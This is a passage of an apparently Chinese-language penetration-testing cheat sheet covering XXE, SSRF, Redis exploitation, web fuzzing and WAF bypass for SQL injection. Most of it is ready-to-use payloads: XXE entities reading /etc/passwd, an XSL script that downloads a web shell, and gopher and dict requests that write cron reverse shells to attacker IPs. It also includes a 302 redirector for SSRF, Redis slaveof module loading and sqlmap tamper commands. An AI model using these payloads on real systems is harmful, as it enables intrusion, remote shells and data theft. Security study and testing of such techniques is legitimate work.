id=\"内网端口扫描\"><a class=\"anchor\" href=\"#内网端口扫描\">#</a> 内网端口扫描</h2>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;  \n&lt;!DOCTYPE data SYSTEM &quot;http://127.0.0.1:515/&quot; [  \n&lt;!ELEMENT data (#PCDATA)&gt;  \n]&gt;\n&lt;data&gt;4&lt;/data&gt;\n可使用burpsuite的intruder模块进行遍历\n</code></pre>\n<h2 id=\"-58\"><a class=\"anchor\" href=\"#-58\">#</a> </h2>\n<h2 id=\"-59\"><a class=\"anchor\" href=\"#-59\">#</a> </h2>\n<h2 id=\"内部dtd利用\"><a class=\"anchor\" href=\"#内部dtd利用\">#</a> 内部 DTD 利用</h2>\n<h2 id=\"-60\"><a class=\"anchor\" href=\"#-60\">#</a> </h2>\n<h2 id=\"-61\"><a class=\"anchor\" href=\"#-61\">#</a> </h2>\n<h2 id=\"linux\"><a class=\"anchor\" href=\"#linux\">#</a> Linux</h2>\n<pre><code>\t&lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;\n\t&lt;!ENTITY % ISOamsa 'Your DTD code'&gt;\n%local_dtd;\n</code></pre>\n<h2 id=\"-62\"><a class=\"anchor\" href=\"#-62\">#</a> </h2>\n<h2 id=\"-63\"><a class=\"anchor\" href=\"#-63\">#</a> </h2>\n<h2 id=\"windows\"><a class=\"anchor\" href=\"#windows\">#</a> Windows</h2>\n<pre><code>&lt;!ENTITY % local_dtd SYSTEM &quot;file:///C:\\Windows\\System32\\wbem\\xml\\cim20.dtd&quot;&gt;\n&lt;!ENTITY % SuperClass '&gt;Your DTD code&lt;!ENTITY test &quot;test&quot;'&gt;\n%local_dtd;\n&lt;?xml version=&quot;1.0&quot; ?&gt;\n&lt;!DOCTYPE message [\n&lt;!ENTITY % local_dtd SYSTEM &quot;file:///opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd&quot;&gt;\n\n&lt;!ENTITY % condition 'aaa)&gt;\n    &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;\n    &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;\n    &amp;#x25;eval;\n    &amp;#x25;error;\n    &lt;!ELEMENT aa (bb'&gt;\n\n%local_dtd;\n]&gt;\n&lt;message&gt;any text&lt;/message&gt;\n</code></pre>\n<h2 id=\"-64\"><a class=\"anchor\" href=\"#-64\">#</a> </h2>\n<h2 id=\"-65\"><a class=\"anchor\" href=\"#-65\">#</a> </h2>\n<h2 id=\"xxe写shell\"><a class=\"anchor\" href=\"#xxe写shell\">#</a> XXE 写 shell</h2>\n<pre><code>当XXE支持XSL时\n&lt;?xml version='1.0'?&gt;\n&lt;xsl:stylesheet version=&quot;1.0&quot;\nxmlns:xsl=&quot;http://www.w3.org/1999/XSL/Transform&quot;\nxmlns:msxsl=&quot;urn:schemas-microsoft-com:xslt&quot;\nxmlns:user=&quot;http://mycompany.com/mynamespace&quot;&gt;\n&lt;msxsl:script language=&quot;C#&quot; implements-prefix=&quot;user&quot;&gt;\n&lt;![CDATA[\npublic string xml()\n&#123;\n    System.Net.WebClient webClient = new System.Net.WebClient();\n    webClient.DownloadFile(&quot;https://x.x.x.x/shell.txt&quot;,\n                   @&quot;c:\\inetpub\\wwwroot\\shell.aspx&quot;);\n\nreturn &quot;Exploit Success&quot;;\n&#125;\n]]&gt;\n&lt;/msxsl:script&gt;\n&lt;xsl:template match=&quot;/&quot;&gt;\n&lt;xsl:value-of select=&quot;user:xml()&quot;/&gt;\n&lt;/xsl:template&gt;\n&lt;/xsl:stylesheet&gt;\n</code></pre>\n<h2 id=\"-66\"><a class=\"anchor\" href=\"#-66\">#</a> </h2>\n<h2 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> SSRF</h2>\n<h2 id=\"-67\"><a class=\"anchor\" href=\"#-67\">#</a> </h2>\n<h3 id=\"定义\"><a class=\"anchor\" href=\"#定义\">#</a> 定义</h3>\n<pre><code>服务端请求伪造\n构造一个由服务器发出请求的漏洞\n服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制\n</code></pre>\n<h2 id=\"-68\"><a class=\"anchor\" href=\"#-68\">#</a> </h2>\n<h3 id=\"成因\"><a class=\"anchor\" href=\"#成因\">#</a> 成因</h3>\n<pre><code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()等函数使用不当会造成SSRF漏洞\n</code></pre>\n<h2 id=\"-69\"><a class=\"anchor\" href=\"#-69\">#</a> </h2>\n<h3 id=\"挖掘-2\"><a class=\"anchor\" href=\"#挖掘-2\">#</a> 挖掘</h3>\n<pre><code>转码服务\n在线翻译\n获取超链接的标题等内容进行显示\n请求远程服务器资源的地方，图片加载与下载(通过URL地址加载或下载图片)\n图片、文章收藏功能\n对外发起网络请求的地方，网站采集、网页抓取的地方。\n头像 (远程加载头像)\n一切要你输入网址的地方和可以输入ip的地方。\n数据库内置功能(mongodb的copyDatabase函数)\n邮件系统\n文件处理\n在线处理工具\n从URL关键字中寻找：share、wap、url、link、src、source、target、u、3g、display、sourceURl、imageURL、domain\n</code></pre>\n<h2 id=\"-70\"><a class=\"anchor\" href=\"#-70\">#</a> </h2>\n<h2 id=\"-71\"><a class=\"anchor\" href=\"#-71\">#</a> </h2>\n<h2 id=\"xml-2\"><a class=\"anchor\" href=\"#xml-2\">#</a> XML</h2>\n<pre><code>&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/evil.dtd&quot;&gt;\n&lt;!ENTITY % file system &quot;file:///etc/passwd&quot; &gt;\n&lt;!ENTITY % d SYSTEM &quot;http://wuyun.org/file?data=%file&quot;&gt;\n&lt;!DOCTYPE roottag PUBLIC &quot;-//VSR//PENTEST//EN&quot; &quot;http://wuyun.org/urlin&quot;&gt;\n&lt;xenc:AgreementMethod Algorithm= &quot;http://wuyun.org/1&quot;&gt;\n&lt;xenc:EncryptionProperty Target= &quot;http://wuyun.org/2&quot;&gt;\n&lt;xenc:CipherReference URI= &quot;http://wuyun.org/3&quot;&gt;\n&lt;xenc:DataReference URI= &quot;http://wuyun.org/4&quot;&gt;\n&lt;Reference URI=&quot;http://wuyun.org/5&quot;&gt;\n&lt;To xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;http://wuyun.org/to&lt;/To&gt;\n&lt;ReplyTo xmlns=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;\n&lt;Address&gt;http://wuyun.org/rto&lt;/Address&gt;\n&lt;input message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/ip&quot; /&gt;\n&lt;output message=&quot;wooyun&quot; wsa:Action=&quot;http://wuyun.org/op&quot; /&gt;\n&lt;wsp:PolicyReference URI=“http://wuyun.org/pr&quot;&gt;\n&lt;fed:Federation FederationID=&quot;http://wuyun.org/fid&quot;&gt;\n&lt;fed:FederationInclude&gt;http://wuyun.org/inc&lt;/fed:FederationInclude&gt;\n&lt;fed:TokenIssuerName&gt;http://wuyun.org/iss&lt;/fed:TokenIssuerName&gt;\n&lt;mex:MetadataReference&gt;\n&lt;wsa:Address&gt;http://wuyun.org/mex&lt;/wsa:Address&gt;\n&lt;/mex:MetadataReference&gt;\n&lt;edmx:Reference URI=&quot;http://wuyun.org/edmxr&quot;&gt;\n&lt;edmx:AnnotationsReference URI=&quot;http://wuyun.org/edmxa&quot;&gt;\n&lt;xbrli:identifier scheme=&quot;http://wuyun.org/xbr&quot;&gt;\n&lt;link:roleType roleURI=&quot;http://wuyun.org/role&quot;&gt;\n&lt;stratml:Source&gt;http://wuyun.org/stml&lt;/stratml:Source&gt;\n</code></pre>\n<h2 id=\"-72\"><a class=\"anchor\" href=\"#-72\">#</a> </h2>\n<h2 id=\"-73\"><a class=\"anchor\" href=\"#-73\">#</a> </h2>\n<h2 id=\"数据库\"><a class=\"anchor\" href=\"#数据库\">#</a> 数据库</h2>\n<h2 id=\"-74\"><a class=\"anchor\" href=\"#-74\">#</a> </h2>\n<h2 id=\"-75\"><a class=\"anchor\" href=\"#-75\">#</a> </h2>\n<h2 id=\"mongodb\"><a class=\"anchor\" href=\"#mongodb\">#</a> MongoDB</h2>\n<pre><code>db.copyDatabase('\\r\\nconfig set dbfilename ssrf\\r\\nquit\\r\\n’,'test','10.6.4.166:6379')\n</code></pre>\n<h2 id=\"-76\"><a class=\"anchor\" href=\"#-76\">#</a> </h2>\n<h2 id=\"-77\"><a class=\"anchor\" href=\"#-77\">#</a> </h2>\n<h2 id=\"postgressql\"><a class=\"anchor\" href=\"#postgressql\">#</a> PostgresSQL</h2>\n<pre><code>SELECT dblink_send_query(\n 'host=127.0.0.1 \ndbname=quit \nuser=\\'\\r\\nconfig set dbfilename wyssrf\\r\\n\\quit\\r\\n' \npassword=1 port=6379 sslmode=disable', \n'select version();’ \n);\n</code></pre>\n<h2 id=\"-78\"><a class=\"anchor\" href=\"#-78\">#</a> </h2>\n<h2 id=\"-79\"><a class=\"anchor\" href=\"#-79\">#</a> </h2>\n<h2 id=\"mssql\"><a class=\"anchor\" href=\"#mssql\">#</a> MSSQL</h2>\n<pre><code>SELECT openrowset('SQLOLEDB', 'server=192.168.1.5;uid=sa;pwd=sa;database=master')\nSELECT * FROM OpenDatasource('SQLOLEDB', 'Data Source=ServerName;User ID=sa;Password=sa' ) .Northwind.dbo.Categories\n</code></pre>\n<h2 id=\"-80\"><a class=\"anchor\" href=\"#-80\">#</a> </h2>\n<h2 id=\"-81\"><a class=\"anchor\" href=\"#-81\">#</a> </h2>\n<h2 id=\"图片处理函数\"><a class=\"anchor\" href=\"#图片处理函数\">#</a> 图片处理函数</h2>\n<pre><code>FFmpeg\nconcat:http://wyssrf.wuyun.org/header.y4m|file:///etc/passwd\nImageMagick\nfill 'url(http://wyssrf.wuyun.org)'\n</code></pre>\n<h2 id=\"-82\"><a class=\"anchor\" href=\"#-82\">#</a> </h2>\n<h3 id=\"攻击\"><a class=\"anchor\" href=\"#攻击\">#</a> 攻击</h3>\n<pre><code>测试代码,需安装phpcurl模块apt-get install php7.0-curl\n&lt;?php\necho 'r u ok?';\nfunction curl($url)&#123;  \n$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $url);\ncurl_setopt($ch, CURLOPT_HEADER, 0);\ncurl_exec($ch);\ncurl_close($ch);\n&#125;\n$url = $_GET['url'];\ncurl($url);\n?&gt;\n对内网、本地进行端口扫描，获取服务的banner 信息\n攻击运行在内网或本地的应用程序\n对内网 WEB 应用进行指纹识别，通过访问默认文件实现(如：readme文件)\n攻击内外网的 web 应用，主要是使用 GET 参数就可以实现的攻击(如：Struts2，sqli)\n读取内网资源(如：利用file协议读取本地文件等)\n跳板\n无视cdn\n利用Redis未授权访问，HTTP CRLF注入实现getshell\n</code></pre>\n<h2 id=\"-83\"><a class=\"anchor\" href=\"#-83\">#</a> </h2>\n<h2 id=\"-84\"><a class=\"anchor\" href=\"#-84\">#</a> </h2>\n<h2 id=\"文件读取\"><a class=\"anchor\" href=\"#文件读取\">#</a> 文件读取</h2>\n<pre><code>&gt;curl -v 'http://192.168.0.110/ssrf.php?url=file:///etc/passwd'\n</code></pre>\n<p><img data-src=\"12.png\" alt=\"\" /></p>\n<pre><code>?url=php://filter/read=convert.base64-encode/resource=./1.php\n</code></pre>\n<h2 id=\"-85\"><a class=\"anchor\" href=\"#-85\">#</a> </h2>\n<h3 id=\"端口探测\"><a class=\"anchor\" href=\"#端口探测\">#</a> 端口探测</h3>\n<pre><code>&gt;curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:22/'\n</code></pre>\n<p><img data-src=\"13.png\" alt=\"\" /></p>\n<pre><code>&gt;curl -v 'http://www.xx.com/ssrf.php?url=dict://127.0.0.1:6379/info'\n</code></pre>\n<p><img data-src=\"14.png\" alt=\"\" /></p>\n<h2 id=\"-86\"><a class=\"anchor\" href=\"#-86\">#</a> </h2>\n<h2 id=\"-87\"><a class=\"anchor\" href=\"#-87\">#</a> </h2>\n<h2 id=\"ssrfredis\"><a class=\"anchor\" href=\"#ssrfredis\">#</a> SSRF+Redis</h2>\n<pre><code>&gt;curl -v 'http://192.168.0.112/ssrf.php?url=gopher://192.168.0.120:6379/_*1%250d%250a%248%250d%250aflushall%250d%250a%2a3%250d%250a%243%250d%250aset%250d%250a%241%250d%250a1%250d%250a%2464%250d%250a%250d%250a%250a%250a%2a%2f1%20%2a%20%2a%20%2a%20%2a%20bash%20-i%20%3E%26%20%2fdev%2ftcp%2f192.168.0.108%2f12345%200%3E%261%250a%250a%250a%250a%250a%250d%250a%250d%250a%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%243%250d%250adir%250d%250a%2416%250d%250a%2fvar%2fspool%2fcron%2f%250d%250a%2a4%250d%250a%246%250d%250aconfig%250d%250a%243%250d%250aset%250d%250a%2410%250d%250adbfilename%250d%250a%244%250d%250aroot%250d%250a%2a1%250d%250a%244%250d%250asave%250d%250aquit%250d%250a'\n</code></pre>\n<p><img data-src=\"15.png\" alt=\"\" /><br />\n<img data-src=\"16.png\" alt=\"\" /></p>\n<h2 id=\"-88\"><a class=\"anchor\" href=\"#-88\">#</a> </h2>\n<h2 id=\"-89\"><a class=\"anchor\" href=\"#-89\">#</a> </h2>\n<h2 id=\"302反弹shell\"><a class=\"anchor\" href=\"#302反弹shell\">#</a> 302 反弹 shell</h2>\n<pre><code>?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=flushall\n302.php\n&lt;?php\n$ip = $_GET['ip'];\n$port = $_GET['port'];\n$scheme = $_GET['s'];\n$data = $_GET['data'];\nheader(&quot;Location: $scheme://$ip:$port/$data&quot;);\n?&gt;\n?url=http://xxxx/reverse.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;bhost=*.*.*.*&amp;bport=1234\nreverse.php\n&lt;?php\n$ip = $_GET['ip'];\n$port = $_GET['port'];\n$bhost = $_GET['bhost'];\n$bport = $_GET['bport'];\n$scheme = $_GET['s'];\nheader(&quot;Location: $scheme://$ip:$port/set:0:\\&quot;\\\\x0a\\\\x0a*/1\\\\x20*\\\\x20*\\\\x20*\\\\x20*\\\\x20/bin/bash\\\\x20-i\\\\x20&gt;\\\\x26\\\\x20/dev/tcp/&#123;$bhost&#125;/&#123;$bport&#125;\\\\x200&gt;\\\\x261\\\\x0a\\\\x0a\\\\x0a\\&quot;&quot;);\n?&gt;\n?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dir:/var/spool/cron/\n?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=config:set:dbfilename:root\n?url=http://xxxx/302.php?s=dict&amp;ip=10.20.*.*&amp;port=6379&amp;data=save\n可设置burp–&gt;intruder指定变量跑。\n</code></pre>\n<h2 id=\"-90\"><a class=\"anchor\" href=\"#-90\">#</a> </h2>\n<h2 id=\"-91\"><a class=\"anchor\" href=\"#-91\">#</a> </h2>\n<h2 id=\"mysql\"><a class=\"anchor\" href=\"#mysql\">#</a> Mysql</h2>\n<pre><code>https://github.com/FoolMitAh/mysql_gopher_attack\nhttps://fireshellsecurity.team/isitdtu-friss/\n</code></pre>\n<h2 id=\"-92\"><a class=\"anchor\" href=\"#-92\">#</a> </h2>\n<h2 id=\"-93\"><a class=\"anchor\" href=\"#-93\">#</a> </h2>\n<h2 id=\"weblogic-ssrfredis\"><a class=\"anchor\" href=\"#weblogic-ssrfredis\">#</a> Weblogic SSRF+Redis</h2>\n<pre><code>探测\n/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:80\nRedis反弹\nset 1 &quot;\\n\\n\\n\\n* * * * * root bash -i &gt;&amp; /dev/tcp/121.36.67.230/4444 0&gt;&amp;1\\n\\n\\n\\n&quot;\nconfig set dir /etc/\nconfig set dbfilename crontab\nsave\n/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://192.168.0.110:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F121.36.67.230%2F4444%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa\nSSRF+内网Struct2\nhttp://www.xx.com/ssrf.php?url=http://10.1.1.1/action?action?redirect:http://attackerip/\n</code></pre>\n<h2 id=\"ueditor-ssrf\"><a class=\"anchor\" href=\"#ueditor-ssrf\">#</a> Ueditor SSRF</h2>\n<pre><code>/editor/ueditor/php/controller.php?action=catchimage&amp;source[]=http://my.ip/?aaa=1%26logo.png\n</code></pre>\n<h2 id=\"discuz\"><a class=\"anchor\" href=\"#discuz\">#</a> Discuz</h2>\n<pre><code>/forum.php?mod=ajax&amp;action=downremoteimg&amp;message=[img=1,1]http://b182oj.ceye.io/xx.jpg[/img]&amp;formhash=xxoo\n</code></pre>\n<h2 id=\"探测存活主机\"><a class=\"anchor\" href=\"#探测存活主机\">#</a> 探测存活主机</h2>\n<pre><code>直接访问\nhttp://www.xx.com/ssrf.php?url=http://192.168.0.1\n</code></pre>\n<p><img data-src=\"17.png\" alt=\"\" /></p>\n<pre><code>伪造POST请求\n&gt;curl -v 'http://www.xx.com/ssrf.php?url=gopher://192.168.0.10:80/_POST%20/post.php%20HTTP/1.1%250d%250aHost:%20192.168.220.139%250d%250aUser-Agent:%20curl/7.42.0%250d%250aAccept:%20*/*%250d%250aContent-Type:%20application/x-www-form-urlencoded%250d%250a%250d%250acmd=bbbbb'\n</code></pre>\n<h2 id=\"绕过方法\"><a class=\"anchor\" href=\"#绕过方法\">#</a> 绕过方法</h2>\n<pre><code>本地绕过\nhttp://127.0.0.1=http://localhost\n[::]绕过\nhttp://[::]:80=http://127.0.0.1\n@绕过\nhttp://www.xx.com/1.php?url=http://www.xx.com@127.0.0.1:8080\n利用短网址\nhttp://tool.chinaz.com/tools/dwz.aspx\nhttp://dwz.cn/\nDNS解析\nhttp://www.qq.com.127.0.0.1.xip.io，可解析为127.0.0.1\n自己域名设置A记录，指向127.0.0.1\n进制转换\n127.0.0.1\n八进制：0177.0.0.1\n十六进制：0x7f.0.0.1\n十进制：2130706433\nhttp://www.bejson.com/convert/ip2int/\n句号\n127。0。0。1\n302脚本\n&lt;?php\n$ip = $_GET['ip'];\n$port = $_GET['port'];\n$scheme = $_GET['s'];\n$data = $_GET['data'];\nheader(&quot;Location: $scheme://$ip:$port/$data&quot;);\n?&gt;\n攻击方VPS监听8080\ndict协议\ndict://www.attack.com:8080/hello:dict等于\nssrf.php?url=http://attack.com/302.php?s=dict&amp;ip=www.attack.com&amp;port=8080&amp;data=hello:dict\nGopher协议\ngopher:// www.attack.com:8080/gopher\nssrf.php?url=http://attack.com/302.php?s=gopher&amp;ip=www.attack.com&amp;port=8080&amp;data=gopher\nFile协议\n攻击机新建file.php\n&lt;?php\nheader(&quot;Location: file:///etc/passwd&quot;);\n?&gt;\nssrf.php?url=http://attack.com/file.php\n</code></pre>\n<h2 id=\"gopher协议的脚本转换\"><a class=\"anchor\" href=\"#gopher协议的脚本转换\">#</a> gopher 协议的脚本转换</h2>\n<pre><code>抓取本地测试的正常请求\n&gt;socat -v tcp-listen:4444,fork tcp-connect:目标IP:6379\n</code></pre>\n<p><img data-src=\"18.png\" alt=\"\" /><br />\n<img data-src=\"19.png\" alt=\"\" /></p>\n<pre><code>将捕获日志保存txt\n使用脚本转换为支持gopher协议的字符串\n转换规则\n如果第一个字符是&gt;或者&lt; 那么丢弃该行字符串，表示请求和返回的时间。\n如果前3个字符是+OK 那么丢弃该行字符串，表示返回的字符串。\n将\\r字符串替换成%0d%0a\n空白行替换为%0a\n</code></pre>\n<p><img data-src=\"20.png\" alt=\"\" /></p>\n<pre><code>本地可执行\n</code></pre>\n<p><img data-src=\"21.png\" alt=\"\" /></p>\n<pre><code>远程执行需对空格进行编码后再url编码一次\n*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$63%0d%0a%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20&gt;&amp;%20/dev/tcp/192.168.0.108/12138%200&gt;&amp;1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a\n</code></pre>\n<p><img data-src=\"22.png\" alt=\"\" /><br />\n<img data-src=\"23.png\" alt=\"\" /><br />\n<img data-src=\"24.png\" alt=\"\" /></p>\n<h2 id=\"协议\"><a class=\"anchor\" href=\"#协议\">#</a> 协议</h2>\n<pre><code>Curl版本需低于7.15.1\nfile:可回显时，使用file读取任意文件\ndict:查看端口，操作内网服务\ngopher:可发出get/post请求\n使用gopher协议时，要进行两次url编码\nhttp/https:探测存活主机\n</code></pre>\n<h2 id=\"dict协议写shell\"><a class=\"anchor\" href=\"#dict协议写shell\">#</a> dict 协议写 shell</h2>\n<pre><code>?url=dict://127.0.0.1:6379/set:x:&lt;?php phpinfo();?&gt;\n?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/\n?url=dict://127.0.0.1:6379/config:set:dbfilename:php.php\n?url=dict://127.0.0.1:6379/save\nUnicode编码\n?url=dict://127.0.0.1:6379/set:x:&quot;\\x3C\\x3Fphp\\x20echo `$_GET[x]`\\x3B\\x3F\\x3E&quot;\n</code></pre>\n<h2 id=\"slaveof复制shell到目标\"><a class=\"anchor\" href=\"#slaveof复制shell到目标\">#</a> slaveof 复制 shell 到目标</h2>\n<pre><code>From:http://r3start.net/index.php/2020/05/09/683\n你的redis设置一个shell的键\nYourredis&gt;FLUSHALL\nYourredis&gt;set shell &quot;&lt;?php phpinfo();?&gt;&quot;\n?url=dict://127.0.0.1:6379/slaveof:yourredisIP:6379\n?url=dict://127.0.0.1:6379/config:set:dir:/www/wwwroot/\n?url=dict://127.0.0.1:6379/config:set:dbfilename:test.php\n?url=dict://127.0.0.1:6379/save\n?url=dict://127.0.0.1:6379/slaveof:no:one\n</code></pre>\n<h2 id=\"slaveof反弹shell\"><a class=\"anchor\" href=\"#slaveof反弹shell\">#</a> slaveof 反弹 shell</h2>\n<pre><code>?url=dict://127.0.0.1:6379/slaveof: yourredisIP:6379\n?url=dict://127.0.0.1:6379/config:set:dbfilename:exp.so\n?url=dict://127.0.0.1:6379/MODULE:LOAD:./exp.so\n?url=dict://127.0.0.1:6379/SLAVEOF:NO:ONE\n?url=dict://127.0.0.1:6379/config:set:dbfilename:dump.rdb\n?url=dict://127.0.0.1:6379/system.exec:'curl x.x.x.x/x'\n?url=dict://127.0.0.1:6379/system.rev:x.x.x.x:8887\n</code></pre>\n<h2 id=\"fuzz扫描web\"><a class=\"anchor\" href=\"#fuzz扫描web\">#</a> Fuzz / 扫描 web</h2>\n<pre><code>#dirb http://192.168.0.1 /root/asp.txt,/root/dir.txt -a &quot;USER-AGENT&quot; –c &quot;Cookie&quot; -z 100\n#nikto -C all -h http://192.168.0.107 nikto扫描web服务\n#wpscan --url http://192.168.0.107/ -e u --wordlist /root/wordlist.txt 枚举用户爆破密码\n#wpscan --url http://192.168.0.107/ -e vp 扫描漏洞插件\n#perl joomscan.pl --url 192.168.0.107\n</code></pre>\n<h3 id=\"wfuzz\"><a class=\"anchor\" href=\"#wfuzz\">#</a> WFuzz</h3>\n<pre><code>爆破文件和文件夹\n&gt;wfuzz -w wordlist URL/FUZZ.php\n&gt;wfuzz -w wordlist URL/FUZZ\n枚举数字参数\n&gt;wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZ\nPOST账号密码爆破FUZnZ\n&gt;wfuzz -w userList -w pwdList -d &quot;username=FUZZ&amp;password=FUZ2Z&quot; http://127.0.0.1/login.php\n随机HTTP头\n&gt;wfuzz -z range,0000-9999 -H &quot;X-Forwarded-For: FUZZ&quot; http://127.0.0.1/get.php?userid=666\n使用代理fuzz\n&gt;wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ\n基础认证爆破\n&gt;wfuzz -z list,&quot;username-password&quot; --basic FUZZ:FUZZ URL\n【结果过滤】--hc或--ss不显示符合条件的结果。\n【结果过滤】--sc或--sl或--sw或--sh显示符合条件的结果。\n</code></pre>\n<h3 id=\"cewl\"><a class=\"anchor\" href=\"#cewl\">#</a> Cewl</h3>\n<pre><code>爬行网站存为字典\n&gt;cewl http://www.qq.com/ -w dict.txt\n指定字典长度\n&gt;cewl http://www.qq.com/ -m 9 -w dict.txt\n网站提取Email\n&gt;cewl http://www.qq.com/ -n –e\n</code></pre>\n<h3 id=\"dirsearch\"><a class=\"anchor\" href=\"#dirsearch\">#</a> Dirsearch</h3>\n<pre><code>&gt;python3 dirsearch.py --random-user-agents --recursive --thread 50 --extension php --plain-text-report report.txt –url http://127.0.0.1\n</code></pre>\n<h2 id=\"bypass-waf\"><a class=\"anchor\" href=\"#bypass-waf\">#</a> Bypass WAF</h2>\n<h3 id=\"sql注入分块传输\"><a class=\"anchor\" href=\"#sql注入分块传输\">#</a> SQL 注入分块传输</h3>\n<pre><code>https://github.com/c0ny1/chunked-coding-converter\n</code></pre>\n<p><img data-src=\"25.png\" alt=\"\" /><br />\n<img data-src=\"26.png\" alt=\"\" /></p>\n<pre><code>跑注入点被拦截\n</code></pre>\n<p><img data-src=\"27.png\" alt=\"\" /></p>\n<pre><code>使用分块传输，右键选择\n</code></pre>\n<p><img data-src=\"28.png\" alt=\"\" /><br />\n<img data-src=\"30.png\" alt=\"\" /></p>\n<pre><code>使用SQLMAP跑注入\n</code></pre>\n<p><img data-src=\"31.png\" alt=\"\" /><br />\n<img data-src=\"32.png\" alt=\"\" /></p>\n<pre><code>&gt;python sqlmap.py -r 1.txt --batch --proxy=http://127.0.0.1:8080 --dbs\n</code></pre>\n<p><img data-src=\"33.png\" alt=\"\" /></p>\n<h3 id=\"自动提供可用的tamper\"><a class=\"anchor\" href=\"#自动提供可用的tamper\">#</a> 自动提供可用的 tamper</h3>\n<pre><code>https://github.com/m4ll0k/Atlas\nGET类型的注入\npython atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v\nPOST类型的注入\npython atlas.py --url http://site.com/index/id/ -m POST -D 'test=%%10%%' --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v\n请求头注入\npython atlas.py --url http://site.com/index/id/ -H 'User-Agent: mozilla/5.0%%inject%%' -H 'X-header: test' --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --random-agent -v\n组合tamper\npython atlas.py --url http://site.com/index/id/%%10%% --payload=&quot;-1234 AND 4321=4321-- AAAA&quot; --concat &quot;equaltolike,htmlencode&quot; --random-agent -v\n列出tamper\npython atlas.py -g\n例子\n注入\npython sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3\n</code></pre>\n<p><img data-src=\"658.png\" alt=\"\" /></p>\n<pre><code>可以看到被拦截了\n查找能绕过的tamper\npython atlas.py --url 'http://site.com/index.php?id=Price_ASC' --payload=&quot;') AND 8716=4837 AND ('yajr'='yajr&quot; --random-agent -v\n</code></pre>\n<p><img data-src=\"659.png\" alt=\"\" /></p>\n<pre><code>根据返回码200得到一个可绕过waf的tamper\nversionedkeywords这个tamper\n继续注入\npython sqlmap.py -u 'http://site.com/index.php?id=Price_ASC' --dbs --random-agent -v 3 --tamper=versionedkeywords\n根据状态码来判断有时会有点鸡肋，但是也能用用，随机发挥吧。\n</code></pre>\n<h3 id=\"垃圾数据\"><a class=\"anchor\" href=\"#垃圾数据\">#</a> 垃圾数据</h3>\n<pre><code>#coding=utf-8\nimport random,string\nfrom urllib import parse\n# code by yzddMr6\nvarname_min = 5\nvarname_max = 15\ndata_min = 20\ndata_max = 25\nnum_min = 50\nnum_max = 100\ndef randstr(length):\n\tstr_list = [random.choice(string.ascii_letters) for i in range(length)]\n\trandom_str = ''.join(str_list)\n\treturn random_str\ndef main():\n\tdata=&#123;&#125;\n\tfor i in range(num_min,num_max):\n\t\tdata[randstr(random.randint(varname_min,varname_max))]=randstr(random.randint(data_min,data_max))\n\tprint('&amp;'+parse.urlencode(data)+'&amp;')\nmain()\n放到要注入的字段前后\n</code></pre>\n<h3 id=\"上传bypass\"><a class=\"anchor\" href=\"#上传bypass\">#</a> 上传 bypass</h3>\n<h2 id=\"图片文件头\"><a class=\"anchor\" href=\"#图片文件头\">#</a> 图片文件头</h2>\n<pre><code>PNG 的文件头为十六进制的 89 50 4E 47 0D 0A 1A 0A\nGIF 为 47 49 46 38 37 61\nJPG 为 FF D8 FF E0\n</code></pre>\n<h2 id=\"添加图片头或合并图片包含\"><a class=\"anchor\" href=\"#添加图片头或合并图片包含\">#</a> 添加图片头或合并图片包含</h2>\n<h2 id=\"后缀大小写\"><a class=\"anchor\" 